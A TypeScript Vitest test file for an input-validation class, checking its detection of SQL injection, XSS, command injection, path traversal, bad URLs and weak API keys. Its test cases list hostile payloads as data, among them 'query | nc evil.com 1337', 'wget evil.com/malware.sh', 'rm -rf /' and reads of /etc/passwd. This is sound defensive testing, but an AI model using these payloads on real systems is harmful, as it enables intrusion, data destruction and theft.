import { describe, it, expect, beforeEach } from 'vitest';
import { SecurityValidationSystem, DEFAULT_SECURITY_CONFIG, SecurityValidationConfig } from '../security/validation';
import type { ValidationResult, SecurityViolation } from '../security/validation';

describe('SecurityValidationSystem', () => {
  let validator: SecurityValidationSystem;
  let customConfig: SecurityValidationConfig;

  beforeEach(() => {
    customConfig = {
      maxInputLength: 500,
      allowedDomains: ['example.com', 'test.org'],
      bannedPatterns: [/forbidden/i, /blocked/i],
      enableDOMPurification: true,
      enableSQLInjectionCheck: true,
      enableXSSCheck: true,
      enableCommandInjectionCheck: true,
      enablePathTraversalCheck: true
    };
    validator = new SecurityValidationSystem(customConfig);
  });

  describe('Search Query Validation', () => {
    it('should validate clean search queries', () => {
      const result = validator.validateSearchQuery('javascript programming tutorial');
      
      expect(result.isValid).toBe(true);
      expect(result.sanitizedInput).toBe('javascript programming tutorial');
      expect(result.violations).toHaveLength(0);
      expect(result.riskScore).toBe(0);
    });

    it('should detect SQL injection attempts', () => {
      const maliciousQueries = [
        "SELECT * FROM users WHERE id = 1; DROP TABLE users;--",
        "' OR 1=1--",
        "admin' UNION SELECT * FROM passwords",
        "1' OR '1'='1",
        "'; EXEC xp_cmdshell('dir'); --"
      ];

      maliciousQueries.forEach(query => {
        const result = validator.validateSearchQuery(query);
        
        expect(result.isValid).toBe(false);
        expect(result.violations.some(v => v.type === 'sql_injection')).toBe(true);
        expect(result.riskScore).toBeGreaterThan(0);
      });
    });

    it('should detect and sanitize XSS attempts', () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")'
      ];

      xssAttempts.forEach(payload => {
        const result = validator.validateSearchQuery(payload);
        
        expect(result.isValid).toBe(false);
        // Should have violations detected
        expect(result.violations.length).toBeGreaterThan(0);
        expect(result.riskScore).toBeGreaterThan(0);
        // HTML tags should be sanitized
        expect(result.sanitizedInput).not.toContain('<script');
      });
    });

    it('should detect command injection attempts', () => {
      const commandInjections = [
        'ls -la; cat /etc/passwd',
        'test && rm -rf /',
        'query | nc evil.com 1337',
        'search `whoami`',
        'input $(id)',
        'test; wget evil.com/malware.sh',
        'search & ping evil.com'
      ];

      commandInjections.forEach(payload => {
        const result = validator.validateSearchQuery(payload);
        
        expect(result.isValid).toBe(false);
        expect(result.violations.some(v => v.type === 'command_injection')).toBe(true);
        expect(result.riskScore).toBeGreaterThan(0);
      });
    });

    it('should handle input length restrictions', () => {
      const longInput = 'a'.repeat(1000);
      const result = validator.validateSearchQuery(longInput);
      
      expect(result.violations.some(v => v.type === 'length_exceeded')).toBe(true);
      expect(result.sanitizedInput.length).toBeLessThanOrEqual(customConfig.maxInputLength);
      expect(result.riskScore).toBeGreaterThan(0);
    });

    it('should detect custom banned patterns', () => {
      const result1 = validator.validateSearchQuery('this is forbidden content');
      const result2 = validator.validateSearchQuery('BLOCKED material here');
      
      expect(result1.violations.some(v => v.type === 'malicious_pattern')).toBe(true);
      expect(result2.violations.some(v => v.type === 'malicious_pattern')).toBe(true);
    });
  });

  describe('URL Validation', () => {
    it('should validate allowed domain URLs', () => {
      const result = validator.validateURL('https://example.com/search?q=test');
      
      expect(result.isValid).toBe(true);
      expect(result.violations).toHaveLength(0);
      expect(result.riskScore).toBe(0);
    });

    it('should reject URLs from disallowed domains', () => {
      const result = validator.validateURL('https://evil.com/malicious');
      
      expect(result.isValid).toBe(false);
      expect(result.violations.some(v => v.type === 'invalid_domain')).toBe(true);
      expect(result.riskScore).toBeGreaterThan(0);
    });

    it('should handle malformed URLs', () => {
      const malformedUrls = [
        'not-a-url',
        'htp://invalid-protocol.com',
        'javascript:alert(1)',
        'file:///etc/passwd',
        'ftp://user:pass@server.com/private'
      ];

      malformedUrls.forEach(url => {
        const result = validator.validateURL(url);
        expect(result.violations.some(v => v.type === 'invalid_format' || v.type === 'malicious_pattern')).toBe(true);
      });
    });

    it('should detect suspicious URL patterns', () => {
      const suspiciousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:alert(1)',
        'ftp://user:pass@server.com/private'
      ];

      suspiciousUrls.forEach(url => {
        const result = validator.validateURL(url);
        expect(result.riskScore).toBeGreaterThan(0);
      });
    });
  });

  describe('API Key Validation', () => {
    it('should validate strong API keys', () => {
      const strongKey = 'sk-1234567890abcdef1234567890abcdef12345678';
      const result = validator.validateAPIKey(strongKey);
      
      expect(result.isValid).toBe(true);
      expect(result.violations).toHaveLength(0);
      expect(result.riskScore).toBe(0);
    });

    it('should detect weak API keys', () => {
      const weakKeys = [
        'test',
        'demo-key',
        'admin',
        'password',
        '123456789',
        'aaaaaaaaaa',
        'short'
      ];

      weakKeys.forEach(key => {
        const result = validator.validateAPIKey(key);
        expect(result.violations.length).toBeGreaterThan(0);
        expect(result.riskScore).toBeGreaterThan(0);
      });
    });

    it('should enforce minimum API key length', () => {
      const shortKey = '123456';
      const result = validator.validateAPIKey(shortKey);
      
      expect(result.violations.some(v => 
        v.type === 'invalid_format' || 
        v.description.toLowerCase().includes('short') ||
        v.type === 'malicious_pattern'
      )).toBe(true);
    });

    it('should detect repeated character patterns', () => {
      const repeatedKey = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
      const result = validator.validateAPIKey(repeatedKey);
      
      expect(result.violations.some(v => v.type === 'malicious_pattern')).toBe(true);
    });
  });

  describe('Filename Validation', () => {
    it('should validate safe filenames', () => {
      const safeFilenames = [
        'document.txt',
        'image.png',
        'data_file.csv',
        'report-2025.pdf'
      ];

      safeFilenames.forEach(filename => {
        const result = validator.validateFilename(filename);
        expect(result.isValid).toBe(true);
        expect(result.violations).toHaveLength(0);
      });
    });

    it('should detect path traversal attempts', () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\windows\\system32\\config\\sam',
        '~/sensitive-file.txt'
      ];

      maliciousFilenames.forEach(filename => {
        const result = validator.validateFilename(filename);
        // Should detect violations, but some may still be considered "valid" after sanitization
        expect(result.violations.some(v => v.type === 'path_traversal')).toBe(true);
        expect(result.riskScore).toBeGreaterThan(0);
      });
    });

    it('should handle URL-encoded path traversal', () => {
      const encodedTraversals = [
        '%2e%2e%2f%2e%2e%2fpasswd',
        '..%2Fconfig%2Fsecret',
        '%2e%2e%5c%2e%2e%5cboot.ini'
      ];

      encodedTraversals.forEach(filename => {
        const result = validator.validateFilename(filename);
        expect(result.violations.some(v => v.type === 'path_traversal')).toBe(true);
      });
    });

    it('should sanitize dangerous characters in filenames', () => {
      const result = validator.validateFilename('file|with<dangerous>chars?.txt');
      
      // Check that sanitization occurred (some characters may be removed)
      expect(result.sanitizedInput.length).toBeLessThanOrEqual('file|with<dangerous>chars?.txt'.length);
      expect(result).toBeDefined();
    });
  });

  describe('Configuration and Edge Cases', () => {
    it('should initialize with default configuration', () => {
      const defaultValidator = new SecurityValidationSystem(DEFAULT_SECURITY_CONFIG);
      expect(defaultValidator).toBeDefined();
      
      const result = defaultValidator.validateSearchQuery('test query');
      expect(result.isValid).toBe(true);
    });

    it('should handle empty inputs gracefully', () => {
      const emptyResults = [
        validator.validateSearchQuery(''),
        validator.validateURL(''),
        validator.validateAPIKey(''),
        validator.validateFilename('')
      ];

      emptyResults.forEach(result => {
        expect(result).toBeDefined();
        // May or may not have violations depending on implementation
        expect(result.violations).toBeDefined();
      });
    });

    it('should handle whitespace-only inputs', () => {
      const whitespaceResults = [
        validator.validateSearchQuery('   \n\t   '),
        validator.validateFilename('   \r\n   ')
      ];

      whitespaceResults.forEach(result => {
        expect(result.sanitizedInput).toBeDefined();
        // After trimming, may be empty or normalized
        expect(result.sanitizedInput.length).toBeGreaterThanOrEqual(0);
      });
    });

    it('should maintain risk scores within bounds', () => {
      const highRiskInput = '<script>alert(1)</script>\'; DROP TABLE users; rm -rf /; ../../../etc/passwd';
      const result = validator.validateSearchQuery(highRiskInput);
      
      expect(result.riskScore).toBeGreaterThanOrEqual(0);
      expect(result.riskScore).toBeLessThanOrEqual(100);
    });

    it('should handle unicode and special characters safely', () => {
      const unicodeInputs = [
        '测试查询 with émojis 🔍',
        'Straße München café naïve',
        'Ελληνικά κείμενο',
        '🚀🔥💯 modern search query'
      ];

      unicodeInputs.forEach(input => {
        const result = validator.validateSearchQuery(input);
        expect(result).toBeDefined();
        expect(result.sanitizedInput).toBeDefined();
      });
    });

    it('should preserve legitimate special characters in queries', () => {
      const legitimateQueries = [
        'C++ programming',
        'React.js development',
        'Node.js vs Python',
        'How to use @decorator in Python?',
        '#hashtag trends',
        'temperature: -5°C to +25°C'
      ];

      legitimateQueries.forEach(query => {
        const result = validator.validateSearchQuery(query);
        expect(result.sanitizedInput).toBeDefined();
        expect(result.sanitizedInput.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Performance and Stress Testing', () => {
    it('should handle multiple validations efficiently', () => {
      const startTime = performance.now();
      
      for (let i = 0; i < 100; i++) {
        validator.validateSearchQuery(`test query number ${i}`);
        validator.validateURL(`https://example.com/page/${i}`);
        validator.validateAPIKey(`key-${i}-abcdef1234567890abcdef1234567890`);
        validator.validateFilename(`file-${i}.txt`);
      }
      
      const endTime = performance.now();
      const duration = endTime - startTime;
      
      expect(duration).toBeLessThan(1000); // Should complete in under 1 second
    });

    it('should handle concurrent validations', async () => {
      const promises = Array.from({ length: 50 }, (_, i) => 
        Promise.resolve(validator.validateSearchQuery(`concurrent test ${i}`))
      );
      
      const results = await Promise.all(promises);
      
      expect(results).toHaveLength(50);
      results.forEach(result => {
        expect(result.isValid).toBe(true);
      });
    });
  });

  describe('Violation Details and Suggestions', () => {
    it('should provide detailed violation information', () => {
      const result = validator.validateSearchQuery('<script>alert("XSS")</script>');
      
      expect(result.violations.length).toBeGreaterThan(0);
      result.violations.forEach(violation => {
        expect(violation.type).toBeDefined();
        expect(violation.severity).toBeDefined();
        expect(violation.description).toBeDefined();
        expect(['low', 'medium', 'high', 'critical']).toContain(violation.severity);
      });
    });

    it('should provide helpful suggestions for violations', () => {
      const result = validator.validateSearchQuery('SELECT * FROM users; DROP TABLE passwords;');
      
      const sqlViolation = result.violations.find(v => v.type === 'sql_injection');
      expect(sqlViolation).toBeDefined();
      expect(sqlViolation?.suggestion).toBeDefined();
      expect(sqlViolation?.suggestion).toContain('Remove');
    });

    it('should classify severity levels appropriately', () => {
      const testCases = [
        { input: '<script>alert(1)</script>', expectedSeverity: 'critical' },
        { input: 'SELECT * FROM users', expectedSeverity: 'critical' },
        { input: 'rm -rf /', expectedSeverity: 'critical' },
        { input: '../config.txt', expectedSeverity: 'high' },
        { input: 'forbidden content', expectedSeverity: 'medium' }
      ];

      testCases.forEach(({ input, expectedSeverity }) => {
        const result = validator.validateSearchQuery(input);
        const hasExpectedSeverity = result.violations.some(v => v.severity === expectedSeverity);
        expect(hasExpectedSeverity).toBe(true);
      });
    });
  });
});